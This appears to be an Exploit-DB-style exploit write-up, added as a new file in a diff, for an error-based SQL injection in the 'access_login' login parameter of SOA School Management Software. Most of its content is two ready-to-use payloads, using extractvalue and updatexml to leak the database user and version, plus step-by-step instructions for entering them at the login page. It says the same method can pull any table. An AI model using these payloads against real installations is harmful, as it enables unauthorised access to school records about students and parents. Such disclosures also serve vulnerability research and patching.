@@ -1,0 +1,36 @@
+# Exploit Title: SOA - School Management Software with Integrated
+Parents/Students Portal & Mobile App - 'access_login' SQL Injection
+# Dork: N/A
+# Date: 2018-02-14
+# Exploit Author: Borna nematzadeh (L0RD) or borna.nematzadeh123@gmail.com
+# Vendor Homepage:
+https://codecanyon.net/item/soa-school-management-software-with-integrated-parents-students-portal/20435367?s_rank=495
+# Version: All version
+# Category: Webapps
+# CVE: N/A
+# # # # #
+# Description:
+# The vulnerability allows an attacker to inject sql commands.
+# # # # #
+# Proof of Concept :
+
+SQLI :
+
+http://localhost/PATH/administrator/index.php
+
+# Parameter : access_login (POST)
+#    Type: Error based
+#    Title:  MySQL >= 5.6.35 AND Error based - extractvalue,updatexml
+(XPATH query)
+#    Payload 1: 1') and extractvalue(1,concat(0x3a,user(),0x3a,version()))#
+#    Payload 2: 1') and updatexml(1, concat(0x3a, version(),0x3a,user()),1)#
+#######################################
+# Discrption : The 'username' field is vulnerable in this script
+('access_login' parameter).First inject payload into this parameter.
+# then put anything in password and click login. You will have XPATH syntax
+error in the next page that contains user and db_name .
+# You can find all tables and any information from database by using XPATH
+query .You can use extractvalue() or updatexml() for generating error .
+
+Username : 1') and extractvalue(1,concat(0x3a,user(),0x3a,version()))#
+Password : anything
